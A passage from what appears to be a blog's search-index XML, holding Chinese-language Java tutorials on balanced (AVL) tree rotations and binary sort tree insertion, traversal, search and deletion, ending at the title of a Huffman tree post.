function_">leftHeight</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (left == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> left.height();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回右子树的高度</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">rightHeight</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (right == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> right.height();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回以该结点为根结点的树的高度</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">height</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> Math.max(<span class="built_in">this</span>.left == <span class="literal">null</span> ? <span class="number">0</span> : left.height(), <span class="built_in">this</span>.right == <span class="literal">null</span> ? <span class="number">0</span> : right.height()) + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="左旋转和右旋转的代码实现"><a href="#左旋转和右旋转的代码实现" class="headerlink" title="左旋转和右旋转的代码实现"></a>左旋转和右旋转的代码实现</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 左旋转方法</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">leftRotate</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">// 创建新的结点，以当前根结点的值</span></span><br><span class="line"><span class="type">Node</span> <span class="variable">newNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Node</span>(value);</span><br><span class="line"><span class="comment">// 把新的结点的左子树设置成当前结点的左子树</span></span><br><span class="line">newNode.left = left;</span><br><span class="line"><span class="comment">// 把新的结点的右子树设置成当前结点的右子树的左子树</span></span><br><span class="line">newNode.right = right.left;</span><br><span class="line"><span class="comment">// 把当前结点的值替换成右子结点的值</span></span><br><span class="line">value = right.value;</span><br><span class="line"><span class="comment">// 把当前结点的右子树设置成当前结点右子树的右子树</span></span><br><span class="line">right = right.right;</span><br><span class="line"><span class="comment">// 把当前结点的左子树(左子结点)设置成新的结点</span></span><br><span class="line">left = newNode;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 右旋转方法</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">rightRotate</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">Node</span> <span class="variable">newNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Node</span>(value);</span><br><span class="line">newNode.right = right;</span><br><span class="line">newNode.left = left.right;</span><br><span class="line">value = left.value;</span><br><span class="line">left = left.left;</span><br><span class="line">right = newNode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="添加节点时的平衡代码实现"><a href="#添加节点时的平衡代码实现" class="headerlink" title="添加节点时的平衡代码实现"></a>添加节点时的平衡代码实现</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(Node node)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (node == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (node.value &lt; <span class="built_in">this</span>.value) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.left == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="built_in">this</span>.left = node;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.left.add(node);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.right == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="built_in">this</span>.right = node;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.right.add(node);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 当添加完一个结点后，如果: (右子树的高度-左子树的高度) &gt; 1 , 左旋转</span></span><br><span class="line"><span class="keyword">if</span> (rightHeight() - leftHeight() &gt; <span class="number">1</span>) &#123;</span><br><span class="line"><span class="comment">// 如果它的右子树的左子树的高度大于它的右子树的右子树的高度</span></span><br><span class="line"><span class="keyword">if</span> (right != <span class="literal">null</span> &amp;&amp; right.leftHeight() &gt; right.rightHeight()) &#123;</span><br><span class="line"><span class="comment">// 先对右子结点进行右旋转</span></span><br><span class="line">right.rightRotate();</span><br><span class="line"><span class="comment">// 然后在对当前结点进行左旋转</span></span><br><span class="line">leftRotate(); <span class="comment">// 左旋转..</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// 直接进行左旋转即可</span></span><br><span class="line">leftRotate();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>; <span class="comment">// 必须要!!!</span></span><br><span class="line"><span class="comment">//这个return我也不知道要干嘛，可能为了不进行下面的判断提高效率</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 当添加完一个结点后，如果 (左子树的高度 - 右子树的高度) &gt; 1, 右旋转</span></span><br><span class="line"><span class="keyword">if</span> (leftHeight() - rightHeight() &gt; <span class="number">1</span>) &#123;</span><br><span class="line"><span class="comment">// 如果它的左子树的右子树高度大于它的左子树的左子树的高度</span></span><br><span class="line"><span class="keyword">if</span> (left != <span class="literal">null</span> &amp;&amp; left.rightHeight() &gt; left.leftHeight()) &#123;</span><br><span class="line"><span class="comment">// 先对当前结点的左结点(左子树)-&gt;左旋转</span></span><br><span class="line">left.leftRotate();</span><br><span class="line"><span class="comment">// 再对当前结点进行右旋转</span></span><br><span class="line">rightRotate();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// 直接进行右旋转即可</span></span><br><span class="line">rightRotate();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 数据结构和算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 平衡二叉树 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二叉排序树</title>
      <link href="/posts/ff14/"/>
      <url>/posts/ff14/</url>
      
        <content type="html"><![CDATA[<h1 id="二叉排序树-BST"><a href="#二叉排序树-BST" class="headerlink" title="二叉排序树(BST)"></a>二叉排序树(BST)</h1><h2 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h2><p>二叉排序树（Binary Sort Tree），又称为二叉查找树。它或者是一棵空树，或者是具有下列性质的二叉树：</p><ul><li>若它的左子树不空，则左子树上所有结点的值均小于它的根结点的值；</li><li>若它的右子树不空，则右子树上所有结点的值均大于它的根结点的值；</li><li>它的左、右子树也分别为二叉排序树。</li><li>特别说明：如果有相同的值，可以将该节点放在左子节点或右子节点</li></ul><blockquote><p>构造一棵二又排序树的目的，其实并不是为了排序，而是为了提高查找和插入删除关键字的速度。不管怎么说，在一个有序数据集上的查找，速度总是要快于无序的数据集的，而二叉排序树这种非线性的结构，也有利于插入和删除的实现。</p></blockquote><h2 id="二叉排序树的创建和遍历"><a href="#二叉排序树的创建和遍历" class="headerlink" title="二叉排序树的创建和遍历"></a>二叉排序树的创建和遍历</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.binarysorttree;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BinarySortTreeDemo</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">int</span>[] arr = &#123; <span class="number">7</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">9</span>&#125;;</span><br><span class="line"><span class="type">BinarySortTree</span> <span class="variable">binarySortTree</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BinarySortTree</span>();</span><br><span class="line"><span class="comment">// 循环的添加结点到二叉排序树</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">binarySortTree.add(<span class="keyword">new</span> <span class="title class_">Node</span>(arr[i]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 中序遍历二叉排序树</span></span><br><span class="line">System.out.println(<span class="string">&quot;中序遍历二叉排序树~&quot;</span>);</span><br><span class="line">binarySortTree.infixOrder(); <span class="comment">// 1, 3, 5, 7, 9, 10, 12</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BinarySortTree</span> &#123;</span><br><span class="line"><span class="keyword">private</span> Node root;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Node <span class="title function_">getRoot</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加结点的方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(Node node)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">root = node;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">root.add(node);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 中序遍历</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">infixOrder</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (root != <span class="literal">null</span>) &#123;</span><br><span class="line">root.infixOrder();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;二叉排序树为空，不能遍历&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Node</span> &#123;</span><br><span class="line"><span class="type">int</span> value;</span><br><span class="line">Node left;</span><br><span class="line">Node right;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Node</span><span class="params">(<span class="type">int</span> value)</span> &#123;</span><br><span class="line"><span class="built_in">super</span>();</span><br><span class="line"><span class="built_in">this</span>.value = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;Node [value=&quot;</span> + value + <span class="string">&quot;]&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(Node node)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (node == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (node.value &lt; <span class="built_in">this</span>.value) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.left == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="built_in">this</span>.left = node;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.left.add(node);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.right == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="built_in">this</span>.right = node;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.right.add(node);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">infixOrder</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.left != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="built_in">this</span>.left.infixOrder();</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="built_in">this</span>.value);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.right != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="built_in">this</span>.right.infixOrder();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="查找要删除的节点以及它的父节点"><a href="#查找要删除的节点以及它的父节点" class="headerlink" title="查找要删除的节点以及它的父节点"></a>查找要删除的节点以及它的父节点</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">BinarySortTree</span> &#123;</span><br><span class="line"><span class="comment">// 查找要删除的结点</span></span><br><span class="line"><span class="keyword">public</span> Node <span class="title function_">search</span><span class="params">(<span class="type">int</span> value)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> root.search(value);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查找要删除的结点父结点</span></span><br><span class="line"><span class="keyword">public</span> Node <span class="title function_">searchParent</span><span class="params">(<span class="type">int</span> value)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> root.searchParent(value);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Node</span> &#123;</span><br><span class="line"><span class="comment">// 查找要删除的节点</span></span><br><span class="line"><span class="keyword">public</span> Node <span class="title function_">search</span><span class="params">(<span class="type">int</span> value)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.value == value) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.value &gt; value) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.left == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">this</span>.left.search(value);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.right == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">this</span>.right.search(value);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查找要删除的节点的父节点</span></span><br><span class="line"><span class="keyword">public</span> Node <span class="title function_">searchParent</span><span class="params">(<span class="type">int</span> value)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> ((<span class="built_in">this</span>.left != <span class="literal">null</span> &amp;&amp; <span class="built_in">this</span>.left.value == value) || (<span class="built_in">this</span>.right != <span class="literal">null</span> &amp;&amp; <span class="built_in">this</span>.right.value == value)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.left != <span class="literal">null</span> &amp;&amp; <span class="built_in">this</span>.value &gt; value) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">this</span>.left.searchParent(value);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.right != <span class="literal">null</span> &amp;&amp; <span class="built_in">this</span>.value &lt;= value) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">this</span>.right.searchParent(value);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="删除节点"><a href="#删除节点" class="headerlink" title="删除节点"></a>删除节点</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">BinarySortTree</span> &#123;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> node 传入的结点(也就是待删除节点的右节点，当做二叉排序树的根结点)</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 返回的 以node为根结点的二叉排序树的最小结点的值</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">delRightTreeMin</span><span class="params">(Node node)</span> &#123;</span><br><span class="line"><span class="type">Node</span> <span class="variable">target</span> <span class="operator">=</span> node;</span><br><span class="line"><span class="comment">// 循环的查找左子节点，就会找到最小值</span></span><br><span class="line"><span class="keyword">while</span> (target.left != <span class="literal">null</span>) &#123;</span><br><span class="line">target = target.left;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 删除最小结点</span></span><br><span class="line">delete(target.value);</span><br><span class="line"><span class="keyword">return</span> target.value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">delete</span><span class="params">(<span class="type">int</span> value)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="type">Node</span> <span class="variable">targetNode</span> <span class="operator">=</span> search(value);</span><br><span class="line"><span class="keyword">if</span> (targetNode == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// target节点存在且根节点没有任何子节点，说明根节点就是要删除的节点</span></span><br><span class="line"><span class="keyword">if</span> (root.left == <span class="literal">null</span> &amp;&amp; root.right == <span class="literal">null</span>) &#123;</span><br><span class="line">root = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">Node</span> <span class="variable">parent</span> <span class="operator">=</span> searchParent(value);</span><br><span class="line"><span class="comment">// 删除的节点是叶子节点</span></span><br><span class="line"><span class="keyword">if</span> (targetNode.left == <span class="literal">null</span> &amp;&amp; targetNode.right == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="comment">// 判断targetNode是父节点的左子节点还是右子节点</span></span><br><span class="line"><span class="keyword">if</span> (parent.left == targetNode) &#123;</span><br><span class="line">parent.left = <span class="literal">null</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (parent.right == targetNode) &#123;</span><br><span class="line">parent.right = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (targetNode.left != <span class="literal">null</span> &amp;&amp; targetNode.right != <span class="literal">null</span>) &#123;<span class="comment">// 删除的节点有两棵子树</span></span><br><span class="line"><span class="type">int</span> <span class="variable">minVal</span> <span class="operator">=</span> delRightTreeMin(targetNode.right);</span><br><span class="line">targetNode.value = minVal;<span class="comment">// 找到右子树的最小节点进行替换，也可以找到左子树的最大节点进行替换</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;<span class="comment">// 删除的节点有一棵子树</span></span><br><span class="line"><span class="keyword">if</span> (targetNode.left != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (parent == <span class="literal">null</span>) &#123;</span><br><span class="line">root = targetNode.left;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (parent.left == targetNode) &#123;</span><br><span class="line">parent.left = targetNode.left;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">parent.right = targetNode.left;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (parent == <span class="literal">null</span>) &#123;</span><br><span class="line">root = targetNode.right;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (parent.left == targetNode) &#123;</span><br><span class="line">parent.left = targetNode.right;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">parent.right = targetNode.right;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 数据结构和算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 二叉排序树 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>哈夫曼树以及哈夫曼编码</title>
      <link href="/posts/66a9/"/>
      <url>/posts/66a9/</url>
      
